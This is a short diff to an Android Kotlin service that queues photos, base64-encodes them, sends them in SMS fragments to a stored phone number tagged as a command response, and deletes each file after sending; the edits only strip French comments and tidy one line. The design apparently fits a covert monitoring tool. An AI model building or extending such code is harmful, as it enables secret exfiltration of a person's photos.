@@ -19,7 +19,7 @@ class PhotoUploadService : Service() {
         private val photoQueue = mutableListOf<File>()
         private var isMonitoring = false
         private var handler: Handler? = null
-        private val CHECK_INTERVAL = 30000L  # Vérifie internet toutes les 30s
+        private val CHECK_INTERVAL = 30000L
 
         fun addPhotoToQueue(context: Context, photo: File) {
             synchronized(photoQueue) {
@@ -84,13 +84,12 @@ class PhotoUploadService : Service() {
 
     private fun sendPhotoViaSMS(photo: File) {
         try {
-            val otherNum = getSharedPreferences("SAFI_CONFIG", Context.MODE_PRIVATE)
-                .getString("OTHER_NUM", "") ?: return
+            val prefs = getSharedPreferences("SAFI_CONFIG", Context.MODE_PRIVATE)
+            val otherNum = prefs.getString("OTHER_NUM", "") ?: return
             
             val photoBytes = photo.readBytes()
             val base64 = android.util.Base64.encodeToString(photoBytes, android.util.Base64.NO_WRAP)
             
-            # 📤 Envoyer par fragments (limite SMS)
             val maxChunk = 150
             val totalChunks = (base64.length + maxChunk - 1) / maxChunk
             
@@ -102,11 +101,11 @@ class PhotoUploadService : Service() {
                 val msg = "${Commands.RESPONSE_PHOTO}${photo.name}|$i|$totalChunks|$chunk"
                 
                 sendSmsChunk(otherNum, msg)
-                Thread.sleep(500)  # Éviter saturation réseau
+                Thread.sleep(500)
             }
             
             Log.d(TAG, "✅ Photo ${photo.name} envoyée complètement")
-            photo.delete()  # Supprimer après envoi
+            photo.delete()
             
         } catch (e: Exception) {
             Log.e(TAG, "Erreur envoi photo", e)
